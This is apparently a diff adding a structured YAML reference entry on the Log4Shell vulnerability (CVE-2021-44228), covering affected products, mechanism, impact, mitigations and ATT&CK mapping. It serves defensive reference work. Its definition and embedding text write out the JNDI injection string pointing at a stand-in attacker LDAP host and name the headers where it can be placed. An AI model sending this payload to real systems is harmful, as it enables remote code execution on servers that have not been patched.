@@ -1,0 +1,90 @@
+# GR Atom: CVE-2021-44228
+# Schema: atom_schema.yaml v5.1
+# Status: enriched
+
+identity:
+  id: "VUL-INJECT-CVE202144228-001"
+  name: "CVE-2021-44228"
+  normalized_name: "cve_2021_44228"
+  aliases:
+    - "Log4Shell"
+    - "Log4j RCE"
+    - "Log4j JNDI Injection"
+
+classification:
+  is_infrastructure: false
+  type: "vulnerability"
+  abstraction_level: 1
+  atom_tags:
+    - INJ
+    - EXEC
+    - INITIAL
+    - WEB
+    - HTTP
+
+scope:
+  target_layers: ["L5", "L6", "L7"]
+  target_zones: ["Z2", "Z3", "Z4"]
+  target_components:
+    - "Apache Log4j 2.x (2.0-beta9 through 2.14.1)"
+    - "Java Applications using Log4j"
+    - "Apache Struts"
+    - "Apache Solr"
+    - "Apache Druid"
+    - "Elastic Logstash"
+    - "VMware vCenter"
+    - "Minecraft Servers"
+
+definition:
+  what: "CVE-2021-44228 (Log4Shell) is a critical remote code execution vulnerability in Apache Log4j 2, a ubiquitous Java logging library. The vulnerability exists in the JNDI lookup feature of Log4j, which allows log messages to include special syntax that triggers remote resource loading via JNDI (Java Naming and Directory Interface) using protocols such as LDAP, RMI, and DNS. An attacker who can control log message content can inject a malicious JNDI lookup string like ${jndi:ldap://attacker.com/a} causing the vulnerable application to connect to an attacker-controlled server and execute arbitrary code. CVSS v3: 10.0 (Critical). Disclosed December 9, 2021."
+  why: "Log4Shell is considered one of the most severe vulnerabilities in internet history due to the extreme ubiquity of Apache Log4j across virtually all Java-based enterprise applications, cloud services, and embedded systems. The vulnerability is trivially exploitable, requires no authentication, and provides full remote code execution. Log4j is embedded in hundreds of thousands of Java applications including Apache Struts, Solr, Druid, Kafka, Elasticsearch, and countless enterprise and cloud products. Mass exploitation began within hours of public disclosure, with nation-state actors and ransomware groups rapidly weaponizing the vulnerability. CISA issued Emergency Directive 22-02 mandating federal agencies to remediate."
+  how: "Exploitation involves injecting a JNDI lookup string into any input that gets logged by a vulnerable Log4j instance. The attacker crafts a string containing ${jndi:ldap://attacker-server/payload} and inserts it into HTTP headers (User-Agent, X-Forwarded-For), form fields, API parameters, or any data path that reaches Log4j. When Log4j processes the log message, it interprets the ${jndi:...} syntax and initiates an outbound LDAP or RMI connection to the attacker-controlled server, which responds with a serialized Java object containing malicious code. The vulnerable JVM deserializes and executes this payload, granting the attacker remote code execution with the privileges of the Java process. Mitigation includes upgrading to Log4j 2.17.0+, setting log4j2.formatMsgNoLookups=true, or removing the JndiLookup class from the classpath."
+  core_concepts:
+    - key: "JNDI Lookup Injection"
+      value: "Log4j's message lookup substitution feature processes ${jndi:...} expressions in log messages, triggering outbound connections to attacker-controlled naming services that return malicious serialized Java objects for code execution"
+    - key: "Ubiquitous Attack Surface"
+      value: "Any input that reaches a Log4j logging call becomes an attack vector, including HTTP headers, query parameters, form data, and protocol fields, making the vulnerability exploitable across virtually any Java application"
+    - key: "Supply Chain Impact"
+      value: "Log4j is a transitive dependency embedded in hundreds of thousands of Java applications, creating a massive software supply chain vulnerability that required coordinated global remediation effort"
+
+relations:
+  - type: is_a
+    target: "VUL-INJECT-INJECTION-001"
+    description: "CVE-2021-44228 is a JNDI injection vulnerability exploiting Log4j's message lookup feature"
+  - type: precedes
+    target: "VUL-INJECT-CVE202145046-001"
+    description: "The initial Log4Shell fix was incomplete, leading to CVE-2021-45046 bypass"
+  - type: precedes
+    target: "VUL-INJECT-CVE202145105-001"
+    description: "Further Log4j patching addressed CVE-2021-45105 denial-of-service issue"
+
+security_profile:
+  mitre_mapping:
+    technique_id: "T1190"
+    tactic: ["Initial Access"]
+
+metadata:
+  created: "2026-02-06"
+  updated: "2026-02-11"
+  version: "1.0"
+  confidence: "high"
+  trust_source: "authoritative"
+  sources:
+    - "CVE-2021-44228 - NVD NIST"
+    - "Apache Log4j Security Advisory"
+    - "CISA Emergency Directive 22-02"
+    - "Lunasec - Log4Shell Original Advisory"
+    - "MITRE ATT&CK T1190 - Exploit Public-Facing Application"
+    - "CISA Known Exploited Vulnerabilities Catalog"
+  search_keywords:
+    - "CVE-2021-44228"
+    - "Log4Shell"
+    - "Log4j RCE"
+    - "Log4j JNDI injection"
+    - "Log4j vulnerability"
+    - "Log4j remote code execution"
+    - "JNDI lookup injection"
+    - "log4j2.formatMsgNoLookups"
+    - "Java logging vulnerability"
+    - "Apache Log4j 2"
+  embedding_text: "CVE-2021-44228 known as Log4Shell is a critical CVSS 10.0 remote code execution vulnerability in Apache Log4j 2 Java logging library discovered in December 2021. The flaw exists in the JNDI lookup feature which processes special expressions like ${jndi:ldap://attacker/payload} in log messages. An attacker who controls any input that gets logged can trigger the vulnerable application to connect to a malicious LDAP or RMI server and execute arbitrary Java code. The vulnerability is trivially exploitable without authentication across HTTP headers, form fields, and any logged data. Log4j is embedded in hundreds of thousands of Java applications making this one of the most impactful vulnerabilities in internet history. Mass exploitation by nation-state actors and ransomware groups began within hours of disclosure. Mitigation requires upgrading to Log4j 2.17.0 or later. Maps to MITRE ATT&CK T1190 Initial Access."
